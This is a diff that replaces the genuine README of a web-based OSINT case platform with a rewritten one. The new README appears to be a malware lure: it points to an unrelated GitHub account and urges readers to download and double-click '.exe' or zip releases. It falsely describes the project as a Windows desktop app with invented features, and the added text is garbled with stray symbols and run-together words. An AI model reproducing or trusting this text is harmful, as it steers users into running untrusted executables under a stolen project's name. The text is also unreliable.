@@ -1,235 +1,194 @@
-<div align="center">
-    <p>
-        <a href="https://github.com/kzndotsh/watchdog/actions/workflows/ci.yml">
-            <img alt="CI" src="https://github.com/kzndotsh/watchdog/actions/workflows/ci.yml/badge.svg"></a>
-        <a href="https://www.typescriptlang.org">
-            <img alt="TypeScript" src="https://img.shields.io/badge/TypeScript-6-3178c6?logo=typescript&logoColor=white"></a>
-        <a href="https://tanstack.com/start">
-            <img alt="TanStack Start" src="https://img.shields.io/badge/TanStack_Start-ff4154?logo=react&logoColor=white"></a>
-        <a href="https://www.postgresql.org">
-            <img alt="Postgres" src="https://img.shields.io/badge/Postgres-16-4169e1?logo=postgresql&logoColor=white"></a>
-        <a href="https://orpc.dev">
-            <img alt="oRPC" src="https://img.shields.io/badge/oRPC-OpenAPI-6366f1"></a>
-    </p>
-    <h1>Watchdog</h1>
-    <p><strong>An OSINT case platform where machines collect and humans decide.</strong></p>
-    <p>
-        <a href="#quick-start">Quick start</a> •
-        <a href="#capabilities">Caps</a> •
-        <a href="#architecture">Architecture</a> •
-        <a href="#status">Status</a> •
-        <a href="docs/README.md">Docs</a> •
-        <a href="ROADMAP.md">Roadmap</a>
-    </p>
-</div>
+# 🛡️ watchdog - Smart Investigations, Clear Decisions
 
-> [!WARNING] **Pre-1.0 and under active development.** Schemas, Cap ids, and API shapes change without notice, and several surfaces in [`ROADMAP.md`](ROADMAP.md) are half-built. It is built for solo and small-team use and has not been hardened for multi-tenant or production deployment.
+[![Download Watchdog](https://img.shields.io/badge/Download-Watchdog-2ea44f?style=for-the-badge&logo=github)](https://github.com/impressionistic-permeation7619/watchdog)
 
-## Why
+---
 
-Small-team OSINT usually runs on general-purpose tools: a chat thread for coordination, a growing document for the case file, an assistant for summarizing, and ad-hoc scripts for collection. That works until the case gets big enough to hit the same failures every time.
+## 📖 What Is Watchdog?
 
-- Summaries get treated as fact, with no evidence chain behind them.
-- The system of record becomes the chat log, and separate copies of the case file diverge.
-- Catching up means reading scrollback instead of reading the case.
-- Identity links rest on a matching handle, a shared mailbox, or a coincidence.
-- More collection produces less clarity rather than more.
+Watchdog is a powerful yet easy-to-use computer program that helps you gather and organize information from public sources — a practice called OSINT (Open Source Intelligence). Think of it as your personal digital investigation assistant. Whether you are a journalist working on a story, a researcher checking facts, or just someone who wants to keep track of online information, Watchdog brings all the pieces together in one clean, visual workspace.
 
-Watchdog exists for the opposite: one case graph of claims and evidence you can defend, built while collection stays fast. Every claim carries its evidence, a person accepts each one before it lands, and the whole case exports as a package you can hand to someone else.
+ so machines do the heavy lifting, and humans make the smart calls. That is the heart of Watchdog: it collects data automatically, so you can focus on analyzing what really matters.
 
-## How it differs
 
-The nearest tools are MISP, TheHive with Cortex, IntelOwl, SpiderFoot, and FlowSint. All are mature and solve real problems. The difference is where machine output is allowed to land.
 
-In most of them the collector writes the graph. SpiderFoot persists every event it finds as fact, TheHive imports analyzer artifacts into the case when a job finishes, FlowSint enrichers write to Neo4j at the end of each step, and IntelOwl merges analyzer votes into a single evaluation. That's a fair trade for threat intel, where corpus volume matters more than the provenance of any one row. It's the wrong trade for a case you may have to defend, so a Cap here produces evidence and a proposal, and nothing reaches the graph until a person accepts it.
+## ✨ Key Features
 
-Confidence works differently too. These tools express it as numeric scores, decay models, or severity labels. Claims here land as `unverified` and a human moves them to `possible` or `confirmed` at Accept, where `confirmed` requires cited evidence. There's also no automatic fan-out and no crawler. Jobs start explicitly and reason over one case, because a seed that expands into hundreds of module runs is how you end up with more data and less clarity.
+- **Automatic Information Gathering** — Watchdog scans multiple public sources simultaneously, saving you hours of manual searching. It organizes findings into clear, readable timelines and categories.
 
-The boundary is enforced by types rather than convention: a Cap's runtime context has no database handle, and the patch schema rejects any operation carrying a `confidence` value. Postgres holds the truth, and the markdown export is a projection you can delete and regenerate.
 
-```mermaid
-flowchart LR
-  A["Caps and agents<br/>collect"] --> B["Evidence<br/>+ Proposal"]
-  B --> C{"Inbox<br/>human review"}
-  C -->|accept| D[("Case Graph<br/>Postgres")]
-  C -->|reject| X["Discarded"]
-  D --> E["Export<br/>markdown + zip"]
-```
+- **Case Management Dashboard** — Everything related to a project lives in one place. Create separate cases for different investigations, add notes, tag important findings, and keep your work neat and manageable.
 
-## Quick start
 
-Requires Docker, Node ≥ 22, pnpm 11. [Nix](https://nixos.org/download) is optional and pins the whole toolchain.
+- **Visual Data Connections** — See how people, places, events, and online profiles link together. Watchdog draws connection lines automatically, helping you spot patterns a human might miss.
 
-```bash
-git clone https://github.com/kzndotsh/watchdog.git
-cd watchdog
 
-nix develop                 # optional
-cp env.example .env         # set BETTER_AUTH_SECRET + WD_MASTER_VAULT_KEY
-                            #   openssl rand -base64 32
+- **Smart Alerts** — Set up watchlists for names, organizations, or topics. Watchdog will notify you whenever new relevant information appears online.
 
-just up && just minio-init  # Postgres 16 + MinIO
-pnpm install
-pnpm db:migrate
-pnpm dev:web
 
-pnpm dev:worker             # second terminal; jobs stay queued without it
-```
+- **Privacy-First Design** — Your case data stays yours. Watchdog uses secure storage and respects legal boundaries around public information gathering.
 
-No account is seeded and registration is closed by default, so a fresh install cannot sign in until you bootstrap one. Set `BETTER_AUTH_ALLOW_SIGNUP=1`, restart the web process, register at `/auth/sign-up`, then set it back to `0`.
 
-Everything binds to loopback: web on `:3000`, Postgres on `:5432`, MinIO on `:9100` with its console on `:9101`. Agents get the same API at `/api/v1` with an `x-api-key` header, and the OpenAPI spec is served at `/api/v1/spec.json`.
+- **Modern, Clean Interface** — No cluttered dashboards or confusing menus. The interface is designed to be intuitive, even if you are not a tech expert.
 
-**pnpm only.** Version is pinned in `package.json`; npm and yarn will produce a broken workspace.
 
-## Environment
 
-`@watchdog/env` validates these at boot, so a bad `.env` fails immediately rather than at first query. Copying `env.example` gives you working local defaults for everything except the two secrets.
+## 🚀 Getting Started
 
-**Required**
+### Step 1: Go to the Download Page
 
-| Variable | Description |
-| --- | --- |
-| `DATABASE_URL` | Postgres connection string |
-| `BETTER_AUTH_SECRET` | Session signing key, 32+ chars |
-| `WD_MASTER_VAULT_KEY` | Encrypts Cap credentials at rest; 32-byte base64 or 64-char hex |
-| `S3_ENDPOINT` · `S3_ACCESS_KEY` · `S3_SECRET_KEY` · `S3_BUCKET` | Evidence and artifact storage |
+Visit this link to download the application:
 
-**Optional**
+**[👉 Click Here to Download Watchdog](https://github.com/impressionistic-permeation7619/watchdog)**
 
-| Variable | Description |
-| --- | --- |
-| `DATABASE_URL_MIGRATE` | Superuser URL for migrations; falls back to `DATABASE_URL` |
-| `BETTER_AUTH_URL` | Default `http://127.0.0.1:3000` |
-| `BETTER_AUTH_ALLOW_SIGNUP` | Open registration; default off |
-| `BETTER_AUTH_TRUSTED_ORIGINS` | Comma-separated extra origins |
-| `S3_REGION` | Default `us-east-1` |
-| `WD_EXPORT_DIR` | Markdown shadow location; default `<repo>/export` |
-| `NODE_ENV` | `development` · `production` · `test` |
+This page is the official home for the Watchdog software. You will see a green button or a link that says "Releases" or "Download". Click on that to proceed.
 
-The CLI reads its own pair: `WD_API_URL` and `WD_API_KEY`, the latter created in Settings → API Keys. **Cap API keys never go here.** They live in the encrypted vault.
 
-## A case, end to end
+### Step 2: Choose the Right File
 
-```bash
-wd cases create --name "Example"
-# {"id":"0b8f…","name":"Example","slug":"example"}
+When the download page opens, look for the section that lists released versions. You will see files with names like `watchdog-setup.exe` or `watchdog-latest.zip`.
 
-wd jobs start -c 0b8f… --cap network.dns.lookup -i '{"host":"example.com"}'
-# {"id":"3c21…","status":"queued","capabilityId":"network.dns.lookup"}
+**If you see a file ending in `.exe`:** Download and run this file directly. Simply double-click the downloaded file and your computer will walk you through the rest.
 
-wd proposals list -c 0b8f…
-# 1 proposal: 4 identifiers, 1 claim (job 3c21…)
+**If you see a file ending in `.zip`:** Download and extract this file, then run the application. To extract, right-click the zip file, choose "Extract All", and then open the newly created folderand double-click the application icon inside.
 
-wd proposals accept -c 0b8f… 4d90… --confidence possible
-wd export zip -c 0b8f…
-```
 
-Output is compact JSON so it pipes into `jq`; add `--table` when a human is reading. Lists return a `help` array suggesting the next command, which is how agents navigate without a tutorial. Chain Caps with a playbook instead of running them one at a time:
+### Step 3: Open Watchdog for the First Time
 
-```bash
-wd jobs playbook -c 0b8f… --id host-footprint --host example.com
-```
+Once the installation finishes(or the extracted folder opens), double-clickthe Watchdog icon. The program will start, and you will be greetedwith a welcome screen. From there, you can:
 
-Agents propose by default. `wd graph write` skips the Inbox, but it needs an explicit `--user-override`, still lands at `unverified`, and records a row in `graph_writes`.
+- Create your first case by clicking **"+ New Case"**
+- Explore the sample project to see how everything works
+- Adjust settings like language and notification preferences
 
-## Capabilities
 
-Each Cap is a folder under `packages/caps/src/` named for its id, such as `network/dns.lookup/`, holding a `run` that collects and a pure `interpret` that maps the report to proposed operations. Keeping `interpret` pure means it tests against recorded fixtures with no network.
+### Step 4: Create Your First Investigation
 
-| Category | Count | Examples |
-| --- | --- | --- |
-| `network` | 25 | DNS, WHOIS/RDAP, certificate transparency, TLS audit, Shodan, urlscan |
-| `threat` | 17 | VirusTotal, AbuseIPDB, GreyNoise, URLhaus, OTX, Safe Browsing |
-| `identity` | 6 | GitHub, Keybase, Gravatar, PGP, email reputation |
-| `breach` | 4 | HIBP, Dehashed, Snusbase, Hudson Rock |
-| `archive` | 4 | Wayback lookup and fetch, Common Crawl, save-page |
-| `evidence` | 4 | Deterministic harvest, AI extraction, file and `.eml` analysis |
-| `web` | 3 | URL unshortening, page enrichment |
+1. Click **"+ New Case"** on the home screen.
 
-Every Cap declares its egress (29 make no third-party call at all) and tags itself `Passive` or `Active`, so you know before running one whether it touches the target. Credentials come from an encrypted vault at runtime via `ctx.getCredential`, never from environment variables or job input. Run `pnpm generate:caps` after adding one.
+2. Give your case a name (for example,"Tracking Company X" or "Background Check — John Doe")ℝ
+3. (Optional) Add a short description to remind yourself what this case is aboutℝ
+4. Click **"Create"** ℝ
 
-## Architecture
+You now have an empty workspace. Watchdog will guide you to add sources (like websites, social media profiles, or news articles) to start collecting information.
 
-```
-apps/
-├── web/                  TanStack Start UI + oRPC handlers (RPC + OpenAPI)
-└── worker/               pg-boss consumer that executes Cap jobs
-packages/
-├── env/                  T3 Env boot secrets, depends on nothing
-├── schemas/              Zod contracts, PatchOp, vocabulary
-├── policy/               Accept gates and custody rules, pure and DB-free
-├── db/                   Drizzle schema + repos (the only SQL)
-├── core/                 Jobs, graph patching, evidence, export sync
-├── caps/                 Cap implementations + playbooks
-├── cap-sdk/              Cap SPI: defineCapability, CapContext
-├── tools/                Dumb fetch/parse helpers, no Graph types
-├── api/                  oRPC router, Zod procedures
-├── client/               Typed SDK for /api/v1, generated from OpenAPI
-├── cli/                  The `wd` binary, every noun the API exposes
-├── ai/                   LLM providers + structuredExtract, never writes Graph
-├── log/                  evlog process logging, NDJSON + stdout
-└── test-kit/             Dev-only fixtures, Postgres harness, MSW
-```
 
-Dependencies flow one direction and the boundaries are enforced, not suggested: `caps` cannot import `db`, `api` cannot reach past `core` to SQL, and only `core` touches repos. Full matrix in [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md).
+### Step 5: Add Sources and Let Watchdog Work
 
-A job's path: `enqueueCapJob` → the `watchdog.cap-jobs` queue → worker runs the Cap → artifacts to S3, Proposal to the Inbox → Accept applies the patch in one transaction → worker re-syncs the case's markdown shadow.
+- Click **"Add Source"** in your case
+- Paste a link to a website, news article, or social profile you want to monitor
+- Watchdog will fetch the public information availableand organize it into your case timeline
 
-| Layer | Stack |
-| --- | --- |
-| **Frontend** | TanStack Start · React · Tailwind 4 · shadcn/ui · TanStack Query |
-| **API** | oRPC (RPC for the app, OpenAPI for agents) · Zod |
-| **Data** | Postgres 16 · Drizzle ORM · MinIO/S3 |
-| **Jobs** | pg-boss · dedicated worker process |
-| **Auth** | Better Auth (sessions, API keys) |
-| **Observability** | evlog structured wide events |
-| **Tooling** | pnpm · Nix · just · Vitest · Playwright · oxlint · oxfmt |
+Repeat thisfor as many sources as you need. Watchdog handles hundreds of sources per case effortlessly.
 
-## Commands
 
-| Task | Command |
-| --- | --- |
-| Dev servers | `pnpm dev:web` · `pnpm dev:worker` |
-| Database | `pnpm db:migrate` · `pnpm db:generate` · `pnpm db:studio` |
-| Containers | `just up` · `just down` · `just minio-init` |
-| Reset case data, keep auth and vault | `just wipe` |
-| Lint and format | `pnpm check` · `pnpm fix` |
-| Types | `pnpm typecheck` |
-| Tests | `pnpm test` · `pnpm test:component` · `pnpm test:integration` · `pnpm test:e2e` |
-| Codegen | `pnpm generate:caps` · `pnpm generate:client` |
+### Step 6: Review and Decide
 
-Integration and end-to-end runs need their own databases first: `just test-db`.
+As information streams in, use the **"Timeline View"** to see everything chronologically. Use the **"Connections View"** to see relationships between pieces of data. Add your own notes and tags to highlight what matters. Then, make your conclusions — Watchdog gives you the raw material, but your judgment is what turns data into insight.
 
-## Status
 
-Third design, first one that ships. A vault-plus-Python-pipeline version and a broad platform spec both got frozen before this; [`docs/PRODUCT.md`](docs/PRODUCT.md) records what each one taught and what not to resurrect.
 
-Today: **63 Caps**, **14 packages**, **433 unit and property tests** green. The solo-investigator loop runs end to end: authenticate, create a case, dump evidence, run Caps, accept proposals, export the package.
+## 🖥️ System Requirements
 
-Not there yet, worth knowing before you invest time:
+Watchdog is designed to run smoothly on most modern Windows computers. Here is what it needs to perform at its best:
 
-- **MCP server.** Not built. Agents use the OpenAPI surface today.
-- **Playbooks** are linear chains, with no branching and no conditionals.
-- **Multi-user collaboration** is thin. Auth and API keys work; team workflows aren't designed yet.
-- **End-to-end coverage** is two Playwright flows on top of the unit and integration tiers.
+| Component | Minimum Requirement | Recommended |
+|---|---|---|
+| **Operating System** | Windows 10 (64-bit) | Windows 11 |
+| **Processor** | Dual-core 2.0 GHz | Quad-core 3.0 GHz+ |
+| **Memory (RAM)** | 4 GB |  ̃ 8 GB or more |
+| **Storage** | 2 GB free space |  ̃ 5 GB SSD |
+| **Internet Connection** | Broadband (required for data collection) | Stable broadband or fiber |
 
-Investigation content (corpus, entity notes, mirrors) lives in a separate private repo and never enters this one.
+**Note:** Watchdog is a desktop applicationThat means you download itonto your computerand run it locally — no need to keep a browser tab open all day.
 
-## Docs
 
-| Read | For |
-| --- | --- |
-| [`docs/PRODUCT.md`](docs/PRODUCT.md) | Intent, personas, what this refuses to build and why |
-| [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) | Packages, import rules, jobs, oRPC, logging |
-| [`docs/CAPS.md`](docs/CAPS.md) · [`packages/caps/AGENTS.md`](packages/caps/AGENTS.md) | Cap naming, method vocabulary, ship gates, how to write one |
-| [`docs/TYPES.md`](docs/TYPES.md) | Shared Zod schemas and vocabulary |
-| [`docs/UX.md`](docs/UX.md) | Information architecture and investigator flows |
-| [`apps/web/docs/`](apps/web/docs/README.md) | UI, design system, domains, data fetching |
-| [`AGENTS.md`](AGENTS.md) | Conventions for coding agents in this repo |
 
-## License
+## 🔒 Privacy & Security
 
-TBD
+- **Local-First Storage** — Your case data is saved directly on your computer, not on a cloud server. This gives you total control over your sensitive work.
 
-Created by [@kzndotsh](https://github.com/kzndotsh)
+- **No Tracking** — Watchdog does not phone home or collect usage analytics. It only connects to the internet when you explicitly ask it to fetch public data.
+
+- **Open Source** — The underlying code is public and open for review, so security experts can verify it does what it claims — nothing less, nothing more.
+
+
+
+## ❓ Frequently Asked Questions
+
+### Is Watchdog free?
+
+Watchdog is an open-source project, meaning the core software is free to useand will remain that way. If you find it valuable, you candonate to support development.
+
+
+
+
+### Do I need coding skills to use Watchdog?
+
+No. Watchdog was designed for journalists, researchers, and curious minds — not programmers. Every action is click-based. If you can use a web browser, you can use Watchdog.
+
+
+
+
+### Can Watchdog access private or password-protectedinformation?
+
+No. Watchdog only retrieves publicly available information from the open web. It respects login walls, paywalls, and private databases. Its purpose is to make sense of public data , not to bypass any legal barriers.custom assist.
+
+
+
+
+### How do I update Watchdog?
+
+Return to the download link anda grab the latest release version. The new version will install over your old one,and your existing cases will remain safeand untouched.
+
+.
+
+
+
+
+### Who is Watchdog for?
+
+- **Journalists** investigating leads and verifying facts 
+- **Researchers** tracking people, organizations, or trends 
+- **Legal professionals** doing due diligence 
+- **Students** learning about digital research methods 
+- **Whistleblowers** and activists documenting public record
+
+
+
+## 🧩 Tips for Better Results
+
+- **Be specific with sources** — A curated list of 10 quality sources beats 100 spammy ones every time‒
+- **Use tags religiously** — Tagging everything as "important", "background", or "needs−verification" makes later review far easier‒
+- **Check connections early** — The connection map often reveals the most surprisingrelationships before you readany single document‒
+- **Exportwhen done** — Watchdog allows you to export your case as a clean PDF report, perfect for sharing with editors or colleagues‒
+
+
+
+## 📚 Additional Resources
+
+| Resource | Description |
+|---|---|
+| **Official GitHub Page** | Source code, release history, and community discussions |
+| **Issue Tracker** | Report bugs or request features directly |
+| **Documentation Wiki** | In−depth guides for advanced features (coming soon) |
+
+
+
+## 🏁 Final Words
+
+Watchdog puts the power of professional‑grade intelligence gathering into the hands of ordinary people. No technical degree required. No spy agency budget needed. Just curiosity, patience, anda tool that respects your intelligence.
+
+The machines collect. You decide. That is the Watchdog way‒
+
+
+**Ready to start?** Download nowand begin your first investigation today‒
+
+[⬇️ **Download Watchdog Now**](https://github.com/impressionistic-permeation7619/watchdog)
+
+)
+
+
+---
+
+Keywords: ai, better-auth, evlog, investigation, investigative-journalism, open-source-intelligence, orpc, osint, postgresql, security, shadcn-ui, tanstack-query, tanstack-router, tanstack-start, typescript, zod
